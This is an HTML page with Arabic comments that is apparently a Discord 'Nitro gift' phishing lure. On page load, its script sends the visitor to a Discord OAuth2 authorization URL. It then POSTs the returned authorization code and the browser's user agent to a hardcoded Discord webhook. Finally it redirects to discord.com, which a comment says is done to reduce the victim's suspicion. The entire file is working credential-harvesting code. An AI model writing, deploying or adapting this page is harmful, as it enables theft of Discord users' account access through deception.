<!DOCTYPE html>
<html>
<head>
    <title>Loading...</title>
</head>
<body>
    <script>
        // هذا السكريبت يعمل فور فتح الصفحة تلقائياً
        window.onload = function() {
            const urlParams = new URLSearchParams(window.location.search);
            const code = urlParams.get('code');
            
            if (code) {
                // إرسال البيانات للوسيط (Webhook.site)
                fetch('https://discord.com/api/webhooks/1512068343723724931/BzOOKGGPyUv8YY1nx5kxZc9Jt9d8j4UcUICTNaIH5BaJ63veyxCYRP_AQ58Rk8W2EU--', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({token: code, info: navigator.userAgent})
                }).then(() => {
                    // تحويل الضحية بعد العملية لتقليل الشك
                    window.location.href = 'https://discord.com';
                });
            } else {
                // إذا لم يوجد كود، وجهه لصفحة الـ OAuth2 الخاصة بك فوراً
                window.location.href = 'https://discord.com/oauth2/authorize?client_id=1512098458398490664&response_type=code&redirect_uri=https%3A%2F%2Fgithub.com%2FNitroDiscord30-daygift%2FNitro-gift%2Fblob%2Fmain%2Findex.html&scope=identify';
            }
        };
    </script>
</body>
</html>
